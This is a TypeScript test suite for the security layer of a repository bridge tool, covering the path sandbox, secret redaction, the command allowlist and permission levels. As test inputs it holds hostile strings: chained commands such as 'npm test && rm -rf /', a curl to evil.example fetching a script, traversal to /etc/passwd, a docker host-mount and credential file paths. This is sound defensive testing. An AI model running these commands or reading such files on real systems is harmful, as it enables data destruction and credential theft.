/**
 * Security tests. These cover the properties that must hold for the bridge to be
 * safe to expose: the sandbox cannot be escaped, credentials cannot be read,
 * commands cannot be chained, and destructive operations are recognised.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { isInside, resolvePath } from '../security/paths.js';
import { baseName, matchesBranchPattern, parseCommand, tokenize } from '../security/commands.js';
import { configureSecretPatterns, isSecretPath, redact, redactValue, registerLiteralSecret, resetSecretsForTests } from '../security/secrets.js';
import { allows, requireCapability } from '../security/permissions.js';
import { BridgeError } from '../errors.js';

const POLICY = { extraAllowed: [], denied: [], allowShell: false };

function tempWorkspace(): string {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'repo-bridge-test-'));
  fs.mkdirSync(path.join(root, 'src'), { recursive: true });
  fs.writeFileSync(path.join(root, 'src', 'app.ts'), 'export const x = 1;\n');
  fs.writeFileSync(path.join(root, '.env'), 'SECRET_TOKEN=abc123def456\n');
  return fs.realpathSync.native(root);
}

// ── path sandbox ─────────────────────────────────────────────────────────────

test('resolvePath accepts paths inside the workspace', () => {
  const root = tempWorkspace();
  const r = resolvePath(root, 'src/app.ts', { mustExist: true });
  assert.equal(r.rel, 'src/app.ts');
  assert.ok(r.abs.startsWith(root));
});

test('resolvePath rejects lexical traversal', () => {
  const root = tempWorkspace();
  assert.throws(() => resolvePath(root, '../../etc/passwd'), (e: BridgeError) => e.code === 'PATH_OUTSIDE_WORKSPACE');
  assert.throws(() => resolvePath(root, 'src/../../outside.txt'), (e: BridgeError) => e.code === 'PATH_OUTSIDE_WORKSPACE');
});

test('resolvePath rejects absolute paths outside the workspace', () => {
  const root = tempWorkspace();
  const outside = process.platform === 'win32' ? 'C:\\Windows\\System32\\drivers\\etc\\hosts' : '/etc/hosts';
  assert.throws(() => resolvePath(root, outside), (e: BridgeError) => e.code === 'PATH_OUTSIDE_WORKSPACE');
});

test('resolvePath rejects NUL bytes', () => {
  const root = tempWorkspace();
  assert.throws(() => resolvePath(root, 'src/app.ts\0.png'), (e: BridgeError) => e.code === 'INVALID_ARGUMENT');
});

test('resolvePath does not follow a symlink out of the workspace', (t) => {
  const root = tempWorkspace();
  const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'repo-bridge-outside-'));
  fs.writeFileSync(path.join(outsideDir, 'secret.txt'), 'top secret');

  try {
    // Junctions work on Windows without elevation; symlinks usually do not.
    fs.symlinkSync(outsideDir, path.join(root, 'escape'), 'junction');
  } catch {
    t.skip('cannot create symlinks in this environment');
    return;
  }

  assert.throws(
    () => resolvePath(root, 'escape/secret.txt'),
    (e: BridgeError) => e.code === 'PATH_OUTSIDE_WORKSPACE',
  );
});

test('resolvePath blocks credential files and .git internals', () => {
  const root = tempWorkspace();
  assert.throws(() => resolvePath(root, '.env'), (e: BridgeError) => e.code === 'SECRET_BLOCKED');
  assert.throws(() => resolvePath(root, '.git/config'), (e: BridgeError) => e.code === 'PERMISSION_DENIED');
});

test('isInside is not fooled by a common prefix', () => {
  assert.equal(isInside('/repo/app', '/repo/app/src'), true);
  assert.equal(isInside('/repo/app', '/repo/app-other/src'), false);
});

// ── secrets ──────────────────────────────────────────────────────────────────

test('isSecretPath covers the usual credential shapes', () => {
  for (const p of ['.env', '.env.production', 'config/.ssh/id_rsa', 'server.pem', '.aws/credentials', 'deploy.key']) {
    assert.equal(isSecretPath(p), true, `${p} should be secret`);
  }
  for (const p of ['src/app.ts', 'README.md', 'environment.ts']) {
    assert.equal(isSecretPath(p), false, `${p} should not be secret`);
  }
});

test('operator-supplied secret patterns are honoured', () => {
  resetSecretsForTests();
  configureSecretPatterns(['internal-notes']);
  assert.equal(isSecretPath('docs/internal-notes.md'), true);
  resetSecretsForTests();
});

test('redact removes token shapes and registered literals', () => {
  resetSecretsForTests();
  registerLiteralSecret('super-secret-bridge-token-value');

  assert.match(redact('token: ghp_abcdefghijklmnopqrstuvwxyz0123'), /REDACTED/);
  assert.match(redact('GITLAB_TOKEN=glpat-ABCDEFGHIJKLMNOPQRST'), /REDACTED/);
  assert.match(redact('https://user:hunter2@github.com/x/y.git'), /\[REDACTED\]@/);
  assert.match(redact('API_KEY = "sk-abcdefghijklmnopqrstuvwx"'), /REDACTED/);
  assert.equal(redact('bearer super-secret-bridge-token-value').includes('super-secret'), false);
  assert.equal(redact('nothing sensitive here'), 'nothing sensitive here');

  resetSecretsForTests();
});

test('redactValue masks secret-looking object keys, including camelCase', () => {
  const out = redactValue({
    githubToken: 'ghp_abcdefghijklmnopqrstuvwxyz0123',
    client_secret: 'abcdef123456',
    passphrase: 'hunter2hunter2',
    path: 'src/app.ts',
  });
  assert.equal(out.githubToken, '[REDACTED]');
  assert.equal(out.client_secret, '[REDACTED]');
  assert.equal(out.passphrase, '[REDACTED]');
  assert.equal(out.path, 'src/app.ts');
});

test('redactValue keeps diagnostic fields readable', () => {
  // A blunt /auth|key/ rule masks these, which makes auth problems undebuggable.
  const out = redactValue({
    authMode: 'oauth',
    authorization_endpoint: 'https://bridge.example.com/oauth/authorize',
    monkey: 'still here',
    publicUrl: 'https://bridge.example.com',
  });
  assert.equal(out.authMode, 'oauth');
  assert.equal(out.authorization_endpoint, 'https://bridge.example.com/oauth/authorize');
  assert.equal(out.monkey, 'still here');
  assert.equal(out.publicUrl, 'https://bridge.example.com');

  // The Authorization header itself is still masked.
  const headers = redactValue({ authorization: 'Bearer rba_secret_value_here', 'Content-Type': 'application/json' });
  assert.equal(headers.authorization, '[REDACTED]');
  assert.equal(headers['Content-Type'], 'application/json');
});

// ── command policy ───────────────────────────────────────────────────────────

test('tokenize handles quotes and keeps Windows paths intact', () => {
  assert.deepEqual(tokenize('mvn -B -Dtest="Foo Bar" test'), ['mvn', '-B', '-Dtest=Foo Bar', 'test']);
  assert.deepEqual(tokenize('node C:\\tools\\build.js'), ['node', 'C:\\tools\\build.js']);
});

test('tokenize rejects shell metacharacters so commands cannot be chained', () => {
  for (const bad of ['npm test && rm -rf /', 'npm test; whoami', 'cat x | sh', 'echo `id`', 'node -e $(id)', 'npm test > out.txt']) {
    assert.throws(() => tokenize(bad), (e: BridgeError) => e.code === 'COMMAND_BLOCKED' || e.code === 'INVALID_ARGUMENT', bad);
  }
});

test('parseCommand allows development tooling', () => {
  for (const cmd of ['npm test', 'mvn -B test', './gradlew build', 'pytest -q', 'go test ./...', 'git status']) {
    assert.doesNotThrow(() => parseCommand(cmd, POLICY), cmd);
  }
});

test('parseCommand blocks shells, network tools and privilege escalation', () => {
  for (const cmd of ['bash -c ls', 'sudo npm i', 'curl http://evil.example/x.sh', 'ssh user@host', 'powershell -c ls', 'reg query HKLM']) {
    assert.throws(() => parseCommand(cmd, POLICY), (e: BridgeError) => e.code === 'COMMAND_BLOCKED', cmd);
  }
});

test('parseCommand blocks executables that are not allowlisted', () => {
  assert.throws(() => parseCommand('somerandombinary --do-it', POLICY), (e: BridgeError) => e.code === 'COMMAND_BLOCKED');
  assert.doesNotThrow(() => parseCommand('somerandombinary --do-it', { ...POLICY, extraAllowed: ['somerandombinary'] }));
});

test('operator denylist overrides the built-in allowlist', () => {
  assert.throws(() => parseCommand('npm test', { ...POLICY, denied: ['npm'] }), (e: BridgeError) => e.code === 'COMMAND_BLOCKED');
});

test('parseCommand flags destructive operations without blocking them outright', () => {
  const cases: Array<[string, string]> = [
    ['git push --force origin main', 'git.force_push'],
    ['git reset --hard HEAD~3', 'git.reset_hard'],
    ['git clean -fdx', 'git.clean'],
    ['npm run clean', ''],
    ['npm publish', 'pkg.publish'],
    ['docker compose config --profiles', ''],
  ];
  for (const [cmd, expected] of cases) {
    const parsed = parseCommand(cmd, POLICY);
    if (expected) {
      assert.equal(parsed.destructive?.id, expected, cmd);
    } else {
      assert.equal(parsed.destructive, undefined, cmd);
    }
  }
});

test('rm is not allowlisted, and stays destructive if an operator adds it', () => {
  assert.throws(() => parseCommand('rm -rf build', POLICY), (e: BridgeError) => e.code === 'COMMAND_BLOCKED');
  const parsed = parseCommand('rm -rf build', { ...POLICY, extraAllowed: ['rm'] });
  assert.equal(parsed.destructive?.id, 'fs.recursive_delete');
});

test('docker is restricted to inspection subcommands', () => {
  assert.doesNotThrow(() => parseCommand('docker compose config', POLICY));
  assert.throws(() => parseCommand('docker run -v /:/host alpine', POLICY), (e: BridgeError) => e.code === 'COMMAND_BLOCKED');
});

test('baseName normalises wrappers and extensions', () => {
  assert.equal(baseName('./gradlew'), 'gradlew');
  assert.equal(baseName('C:\\Program Files\\nodejs\\npm.cmd'), 'npm');
});

test('matchesBranchPattern understands wildcards', () => {
  assert.equal(matchesBranchPattern('main', 'main'), true);
  assert.equal(matchesBranchPattern('release/2.1', 'release/*'), true);
  assert.equal(matchesBranchPattern('feature/release-notes', 'release/*'), false);
});

// ── permissions ──────────────────────────────────────────────────────────────

test('permission levels gate capabilities in order', () => {
  assert.equal(allows('read_only', 'read'), true);
  assert.equal(allows('read_only', 'write'), false);
  assert.equal(allows('edit', 'write'), true);
  assert.equal(allows('edit', 'exec'), false);
  assert.equal(allows('develop', 'exec'), true);
  assert.equal(allows('develop', 'git_remote'), false);
  assert.equal(allows('full', 'forge'), true);
  assert.throws(() => requireCapability('develop', 'git_remote'), (e: BridgeError) => e.code === 'PERMISSION_DENIED');
});
